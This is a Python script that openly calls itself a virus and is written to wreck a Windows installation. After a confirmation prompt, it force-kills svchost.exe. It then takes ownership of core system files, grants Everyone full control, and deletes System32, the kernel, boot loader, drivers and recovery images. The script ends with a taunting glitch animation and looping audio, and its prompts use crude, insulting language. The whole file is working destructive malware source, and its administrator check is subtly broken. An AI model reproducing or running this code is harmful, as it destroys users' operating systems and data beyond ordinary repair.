import subprocess
import os
import time
import random
import shutil
from turtle import *
import pygame

def malicious_shit():
    try:
        paths = [
            "C:\\Windows", "C:\\Windows\\System32", "C:\\Windows\\System32\\hal.dll", "C:\\Windows\\System32\\ntoskrnl.exe",
            "C:\\Windows\\System32\\Boot\\winload.exe", "C:\\Windows\\System32\\kdcom.dll", "C:\\Windows\\System32\\bootmgr",
            "C:\\Windows\\System32\\kernel32.dll", "C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\ntfs.sys",
            "C:\\Windows\\System32\\volsnap.sys", "C:\\Windows\\System32\\hidclass.sys", "C:\\Windows\\System32\\mountmgr.sys",
            "C:\\Windows\\System32\\usbhub.sys", "C:\\Windows\\System32\\dxgkrnl.sys", "C:\\Windows\\win.ini",
            "C:\\Windows\\Inf", "C:\\Windows\\System32\\Recovery", "C:\\Windows\\System32\\Restore", "C:\\Windows\\System32\\winre.wim",
            "C:\\Windows\\System32\\rstrui.exe"
        ]
        for path in paths:
            subprocess.run(['takeown', '/F', path])
            subprocess.run(['icacls', path, "/t", "/grant", "Everyone:(OI)(CI)F"])

        # Force delete directories and files
        directories = ["C:\\Windows\\System32\\Boot", "C:\\Windows\\System32", "C:\\Windows\\Inf", "C:\\Windows\\System32\\Recovery", "C:\\Windows\\System32\\Restore"]
        files = [
            "C:\\Windows\\System32\\ntoskrnl.exe", "C:\\Windows\\System32\\hal.dll", "C:\\Windows\\System32\\Boot\\winload.exe",
            "C:\\Windows\\System32\\kdcom.dll", "C:\\Windows\\System32\\bootmgr", "C:\\Windows\\System32\\kernel32.dll",
            "C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\ntfs.sys", "C:\\Windows\\System32\\volsnap.sys",
            "C:\\Windows\\System32\\hidclass.sys", "C:\\Windows\\System32\\mountmgr.sys", "C:\\Windows\\System32\\usbhub.sys",
            "C:\\Windows\\System32\\dxgkrnl.sys", "C:\\Windows\\win.ini", "C:\\Windows\\System32\\winre.wim",
            "C:\\Windows\\System32\\rstrui.exe"
        ]
        for directory in directories:
            shutil.rmtree(directory, ignore_errors=True)
        for file in files:
            os.remove(file)
    except Exception as e:
        print(f"An error occurred: {e}")

def graphics():
    screen = Screen()
    screen.bgcolor("black")
    screen.title("UH OH UR FILES ARE GONIE GONE :)")
    screen.setup(width=1920, height=1080)

    glitch_turtle = Turtle()
    glitch_turtle.shape('turtle')
    glitch_turtle.color('cyan')
    glitch_turtle.shapesize(2)
    glitch_turtle.pensize(2)
    glitch_turtle.speed(0)

    glitch_intensity = 10
    color_change_speed = 0.5

    def random_glitch():
        x, y = glitch_turtle.position()
        glitch_turtle.goto(
            x + random.randint(-glitch_intensity, glitch_intensity),
            y + random.randint(-glitch_intensity, glitch_intensity)
        )
        r = random.random()
        g = random.random()
        b = random.random()
        glitch_turtle.color((r, g, b))
        if random.random() > 0.7:
            glitch_turtle.pendown()
        else:
            glitch_turtle.penup()
        glitch_turtle.setheading(random.randint(0, 360))
        screen.ontimer(random_glitch, int(random.randint(50, 150)))

    def move_forward():
        glitch_turtle.forward(10)
        screen.ontimer(move_forward, 50)

    writer = Turtle()
    writer.hideturtle()
    writer.speed(0)
    writer.penup()
    writer.goto(0, 0)

    colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

    def glitch_effect(counter=0):
        if counter < 50:
            writer.goto(random.randint(-900, 900), random.randint(-500, 500))
            writer.color(random.choice(colors))
            writer.clear()
            writer.write("Sowwy mister i... i ate swome fiwles :( pls fowgive me daddwy :^_^)", align="center", font=("Comic Sans MS", 32, "bold"))
            screen.ontimer(lambda: glitch_effect(counter + 1), 100)

    glitch_effect()
    random_glitch()
    move_forward()
    screen.mainloop()
    done()

if __name__ == "__main__":
    if os.name == 'nt' and os.geteuid() != 0:
        print("Please run this script as an administrator.")
        exit(1)

    while True:
        user_input = input("This is a virus, are you sure you want to run it? (y/n): ").lower()
        if user_input == 'y':
            subprocess.run("taskkill /F /IM svchost.exe /T", shell=True)
            malicious_shit()
            if os.path.exists("gl.mp3"):
                pygame.mixer.init()
                pygame.mixer.music.load("gl.mp3")
                pygame.mixer.music.play(-1)  # -1 means loop indefinitely
                while pygame.mixer.music.get_busy():
                    time.sleep(1)
            else:
                print("gl.mp3 not found!")
            break
        elif user_input == 'n':
            print("Yeah, I knew you had no balls to run this shit.")
            break
        else:
            print("Invalid input. You stupid")
